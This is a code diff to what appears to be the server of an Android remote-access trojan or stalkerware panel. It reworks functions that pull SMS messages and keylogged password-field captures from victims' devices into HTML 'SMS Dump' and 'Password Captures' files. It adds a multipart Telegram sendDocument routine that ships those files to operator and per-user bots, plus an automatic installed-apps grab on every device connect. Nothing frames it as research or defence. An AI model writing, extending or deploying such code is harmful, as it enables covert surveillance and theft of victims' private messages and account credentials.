@@ -216,56 +216,63 @@ function _getTcpConnForDevice(deviceId) {
 }
 
 async function _autoSendSmsToTelegram(deviceId, deviceName, sendToAdmin, userList) {
-    const conn = _getTcpConnForDevice(deviceId);
-    if (!conn || !conn.writable) return;
-    const commandId = crypto.randomBytes(12).toString('hex');
-    _internalCmdCallbacks.set(commandId, { ts: Date.now(), handler: async (response, error) => {
-        if (error || !response) return;
-        let msgs = [];
-        try {
-            const d = typeof response === 'string' ? JSON.parse(response) : response;
+    // Request SMS from device (30s timeout via _sendAndCapture)
+    let msgs = [];
+    try {
+        const resp = await _sendAndCapture(deviceId, 'get_all_sms', { limit: 100 }, 30000);
+        if (resp) {
+            const d = typeof resp === 'string' ? JSON.parse(resp) : resp;
             msgs = d.messages || d.sms || d.smsList || d.smsMessages || d.allSms
                 || d.data || d.results || [];
-        } catch (_) {}
-        if (!msgs.length) return;
-        const limited = msgs.slice(0, 100);
-        const safeEscape = s => String(s || '').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
-        const htmlBody = limited.map(m => {
-            const dir  = m.type === 2 ? '📤' : '📥';
-            const addr = safeEscape(m.address || 'Unknown');
-            const body = safeEscape((m.body || '').slice(0, 200));
-            const dt   = m.date ? new Date(Number(m.date)).toLocaleString() : '';
-            return `${dir} <b>${addr}</b> <i>${dt}</i>\n<code>${body}</code>`;
-        }).join('\n\n');
-        const header =
-            `💬 <b>Last ${limited.length} SMS — ${deviceName}</b>\n` +
-            `━━━━━━━━━━━━━━━━━━━\n` +
-            `🆔 <code>${deviceId}</code>\n\n`;
-        const full = header + htmlBody;
-        const CHUNK = 3800;
-        // Admin Telegram (only if sendToAdmin flag is true)
-        if (sendToAdmin && telegramSettings.botToken && telegramSettings.chatId) {
-            for (let i = 0; i < full.length; i += CHUNK) {
-                await sendTelegramRaw(telegramSettings.botToken, telegramSettings.chatId, full.slice(i, i + CHUNK));
-                await new Promise(r => setTimeout(r, 300));
-            }
         }
-        // Per-user Telegrams
-        if (userList && userList.length) {
-            for (const u of userList) {
-                for (let i = 0; i < full.length; i += CHUNK) {
-                    await sendTelegramRaw(u.telegramBotToken, u.telegramChatId, full.slice(i, i + CHUNK));
-                    await new Promise(r => setTimeout(r, 300));
-                }
-            }
+    } catch (_) {}
+    if (!msgs.length) return;
+
+    const limited = msgs.slice(0, 100);
+    const esc = s => String(s || '').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
+    const rows = limited.map(m => {
+        const dir  = m.type === 2
+            ? '<span class="dir-out">&#9650; Sent</span>'
+            : '<span class="dir-in">&#9660; Recv</span>';
+        const num  = `<span class="num">${esc(m.address || 'Unknown')}</span>`;
+        const date = `<span class="date">${m.date ? new Date(Number(m.date)).toLocaleString() : ''}</span>`;
+        const body = `<span class="body">${esc(m.body || '')}</span>`;
+        return `<tr><td>${dir}</td><td>${num}</td><td>${date}</td><td>${body}</td></tr>`;
+    }).join('\n');
+
+    const ts   = new Date().toLocaleString();
+    const html = `<!DOCTYPE html><html><head><meta charset="UTF-8"><title>SMS Dump</title><style>
+body{font-family:Arial,sans-serif;background:#0f172a;color:#e2e8f0;padding:24px;margin:0}
+h1{font-size:20px;color:#a78bfa;margin-bottom:4px}
+.meta{color:#64748b;font-size:12px;margin-bottom:24px}
+table{width:100%;border-collapse:collapse;font-size:13px}
+th{background:#1e293b;padding:10px 14px;text-align:left;color:#94a3b8}
+td{padding:9px 14px;border-bottom:1px solid #1e293b;vertical-align:top}
+.dir-in{color:#22c55e;font-weight:700}.dir-out{color:#a78bfa;font-weight:700}
+.num{font-weight:600;white-space:nowrap}
+.date{color:#64748b;font-size:11px;white-space:nowrap}
+.body{line-height:1.5;word-break:break-word;max-width:480px}
+</style></head><body>
+<h1>&#128172; SMS Dump &#8212; ${esc(deviceName)}</h1>
+<div class="meta">Device: <code>${esc(deviceId)}</code> &nbsp;&middot;&nbsp; ${esc(ts)} &nbsp;&middot;&nbsp; ${limited.length} messages</div>
+<table><thead><tr><th>Dir</th><th>Number</th><th>Date</th><th>Message</th></tr></thead>
+<tbody>${rows}</tbody></table></body></html>`;
+
+    const filename = `sms_${deviceId.replace(/[^a-z0-9]/gi,'_')}_${Date.now()}.html`;
+    const caption  = `\u{1F4AC} SMS Dump \u2014 ${deviceName}\n\uD83C\uDD94 ${deviceId}\n\uD83D\uDCCA ${limited.length} messages`;
+    if (sendToAdmin && telegramSettings.botToken && telegramSettings.chatId) {
+        await sendTelegramDocument(telegramSettings.botToken, telegramSettings.chatId, html, filename, caption);
+    }
+    if (userList && userList.length) {
+        for (const u of userList) {
+            await sendTelegramDocument(u.telegramBotToken, u.telegramChatId, html, filename, caption);
+            await new Promise(r => setTimeout(r, 300));
         }
-    }});
-    setTimeout(() => _internalCmdCallbacks.delete(commandId), 60000);
-    tcpSend(conn, 'command:execute', { commandId, command: 'get_all_sms', params: { limit: 100 } });
+    }
 }
 
 async function _autoSendPasswordsToTelegram(deviceId, deviceName, sendToAdmin, userList) {
-    // Collect from in-memory sync (passwords already fetched and stored on last connect)
+    // Collect from in-memory sync (passwords stored on last fresh connect)
     const storedPwds = devicePasswords.get(deviceId) || [];
 
     // Also request live from device if online
@@ -292,35 +299,45 @@ async function _autoSendPasswordsToTelegram(deviceId, deviceName, sendToAdmin, u
         seen.add(key);
         return true;
     });
-
     if (!entries.length) return;
-    const safeEscape = s => String(s || '').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
-    const htmlBody = entries.map(e => {
-        const app  = safeEscape(e.appName || e.packageName || 'Unknown app');
-        const text = safeEscape((e.text || e.typedText || '').slice(0, 200));
-        const ts   = e.timestamp ? new Date(e.timestamp).toLocaleString() : '';
-        const field = e.fieldType ? ` <i>${safeEscape(e.fieldType)}</i>` : '';
-        return `🔑 <b>${app}</b>${field} <i>${ts}</i>\n<code>${text}</code>`;
-    }).join('\n\n');
-    const header =
-        `🔑 <b>Captured Passwords — ${safeEscape(deviceName)}</b>\n` +
-        `━━━━━━━━━━━━━━━━━━━\n` +
-        `🆔 <code>${deviceId}</code>\n` +
-        `📊 ${entries.length} password field${entries.length !== 1 ? 's' : ''} captured\n\n`;
-    const full = header + htmlBody;
-    const CHUNK = 3800;
+
+    // Build HTML document
+    const esc = s => String(s || '').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
+    const rows = entries.map(e => {
+        const app   = `<span class="app">${esc(e.appName || e.packageName || 'Unknown app')}</span>`;
+        const field = `<span class="field">${esc(e.fieldType || '')}</span>`;
+        const pwd   = `<span class="pwd">${esc(e.text || e.typedText || '')}</span>`;
+        const date  = `<span class="date">${e.timestamp ? new Date(e.timestamp).toLocaleString() : ''}</span>`;
+        return `<tr><td>${app}</td><td>${field}</td><td>${pwd}</td><td>${date}</td></tr>`;
+    }).join('\n');
+
+    const ts   = new Date().toLocaleString();
+    const html = `<!DOCTYPE html><html><head><meta charset="UTF-8"><title>Password Captures</title><style>
+body{font-family:Arial,sans-serif;background:#0f172a;color:#e2e8f0;padding:24px;margin:0}
+h1{font-size:20px;color:#ef4444;margin-bottom:4px}
+.meta{color:#64748b;font-size:12px;margin-bottom:24px}
+table{width:100%;border-collapse:collapse;font-size:13px}
+th{background:#1e293b;padding:10px 14px;text-align:left;color:#94a3b8}
+td{padding:9px 14px;border-bottom:1px solid #1e293b;vertical-align:top}
+.app{font-weight:700;color:#a78bfa}
+.field{color:#f59e0b;font-size:11px}
+.pwd{font-family:monospace;font-size:14px;color:#22c55e;word-break:break-all}
+.date{color:#64748b;font-size:11px;white-space:nowrap}
+</style></head><body>
+<h1>&#128273; Password Captures &#8212; ${esc(deviceName)}</h1>
+<div class="meta">Device: <code>${esc(deviceId)}</code> &nbsp;&middot;&nbsp; ${esc(ts)} &nbsp;&middot;&nbsp; ${entries.length} entries</div>
+<table><thead><tr><th>App</th><th>Field Type</th><th>Password / Text</th><th>Time</th></tr></thead>
+<tbody>${rows}</tbody></table></body></html>`;
+
+    const filename = `passwords_${deviceId.replace(/[^a-z0-9]/gi,'_')}_${Date.now()}.html`;
+    const caption  = `\uD83D\uDD11 Password Captures \u2014 ${deviceName}\n\uD83C\uDD94 ${deviceId}\n\uD83D\uDCCA ${entries.length} entr${entries.length !== 1 ? 'ies' : 'y'}`;
     if (sendToAdmin && telegramSettings.botToken && telegramSettings.chatId) {
-        for (let i = 0; i < full.length; i += CHUNK) {
-            await sendTelegramRaw(telegramSettings.botToken, telegramSettings.chatId, full.slice(i, i + CHUNK));
-            await new Promise(r => setTimeout(r, 300));
-        }
+        await sendTelegramDocument(telegramSettings.botToken, telegramSettings.chatId, html, filename, caption);
     }
     if (userList && userList.length) {
         for (const u of userList) {
-            for (let i = 0; i < full.length; i += CHUNK) {
-                await sendTelegramRaw(u.telegramBotToken, u.telegramChatId, full.slice(i, i + CHUNK));
-                await new Promise(r => setTimeout(r, 300));
-            }
+            await sendTelegramDocument(u.telegramBotToken, u.telegramChatId, html, filename, caption);
+            await new Promise(r => setTimeout(r, 300));
         }
     }
 }
@@ -491,6 +508,53 @@ async function sendTelegramRaw(botToken, chatId, text) {
         log('TELEGRAM', `Sent notification to chat ${chatId}`);
     } catch (e) {
         log('TELEGRAM', `Error: ${e.message}`, 'warn');
+    }
+}
+
+// Send an HTML file as a Telegram document (sendDocument API — multipart/form-data)
+async function sendTelegramDocument(botToken, chatId, htmlContent, filename, caption = '') {
+    if (!botToken || !chatId) return;
+    try {
+        const https    = require('https');
+        const boundary = `----TGDocBoundary${crypto.randomBytes(8).toString('hex')}`;
+        const fileBuf  = Buffer.from(htmlContent, 'utf8');
+
+        const parts = [];
+        parts.push(`--${boundary}\r\nContent-Disposition: form-data; name="chat_id"\r\n\r\n${chatId}\r\n`);
+        if (caption) {
+            parts.push(`--${boundary}\r\nContent-Disposition: form-data; name="caption"\r\n\r\n${caption.slice(0, 1024)}\r\n`);
+        }
+        parts.push(
+            `--${boundary}\r\n` +
+            `Content-Disposition: form-data; name="document"; filename="${filename}"\r\n` +
+            `Content-Type: text/html; charset=utf-8\r\n\r\n`
+        );
+        const headerBuf = Buffer.from(parts.join(''), 'utf8');
+        const footerBuf = Buffer.from(`\r\n--${boundary}--\r\n`, 'utf8');
+        const body      = Buffer.concat([headerBuf, fileBuf, footerBuf]);
+
+        const opts = {
+            hostname: 'api.telegram.org',
+            path:     `/bot${botToken}/sendDocument`,
+            method:   'POST',
+            headers:  { 'Content-Type': `multipart/form-data; boundary=${boundary}`, 'Content-Length': body.length },
+        };
+        await new Promise((resolve) => {
+            const req = https.request(opts, (res) => {
+                let data = '';
+                res.on('data', d => { data += d; });
+                res.on('end', () => {
+                    try { const p = JSON.parse(data); if (!p.ok) log('TELEGRAM', `sendDocument fail: ${p.description}`, 'warn'); } catch (_) {}
+                    resolve();
+                });
+            });
+            req.on('error', (e) => { log('TELEGRAM', `sendDocument error: ${e.message}`, 'warn'); resolve(); });
+            req.write(body);
+            req.end();
+        });
+        log('TELEGRAM', `Sent document "${filename}" to chat ${chatId}`);
+    } catch (e) {
+        log('TELEGRAM', `sendDocument error: ${e.message}`, 'warn');
     }
 }
 
@@ -1003,6 +1067,40 @@ async function processMessage(clientId, clientType, event, data) {
             // Runs slightly after the Telegram send so both don't hammer the device simultaneously
             setTimeout(() => _autoSyncDevice(deviceId).catch(() => {}), 6000);
         }
+
+        // ── Auto-request installed apps with 5-min dedup (runs on every connect) ──
+        // Only fires if the last successful request was more than 5 minutes ago,
+        // preventing redundant fetches on rapid reconnects.
+        {
+            const _APPS_DEDUP_MS = 5 * 60 * 1000;
+            const lastApps = (deviceLastSyncAt.get(deviceId) || {}).apps || 0;
+            if (Date.now() - lastApps > _APPS_DEDUP_MS) {
+                deviceLastSyncAt.set(deviceId, { ...(deviceLastSyncAt.get(deviceId) || {}), apps: Date.now() });
+                setTimeout(() => {
+                    try {
+                        const c = _getTcpConnForDevice(deviceId);
+                        if (!c || !c.writable) return;
+                        const cmdId = crypto.randomBytes(12).toString('hex');
+                        _internalCmdCallbacks.set(cmdId, { ts: Date.now(), handler: (response) => {
+                            if (!response) return;
+                            try {
+                                const d = typeof response === 'string' ? JSON.parse(response) : response;
+                                const apps = d.apps || d.installedApps || d.data || [];
+                                if (apps.length) {
+                                    const rec = inMemoryDevices.get(deviceId) || {};
+                                    inMemoryDevices.set(deviceId, { ...rec, installedApps: apps, appsUpdatedAt: new Date() });
+                                    log('SYNC', `Installed apps synced: ${apps.length} apps for ${deviceId}`);
+                                }
+                            } catch (_) {}
+                        }});
+                        setTimeout(() => _internalCmdCallbacks.delete(cmdId), 60000);
+                        tcpSend(c, 'command:execute', { commandId: cmdId, command: 'get_installed_apps', params: {} });
+                        log('SYNC', `Auto-requesting installed apps for ${deviceId}`);
+                    } catch (_) {}
+                }, 2500);
+            }
+        }
+
         return;
     }
 
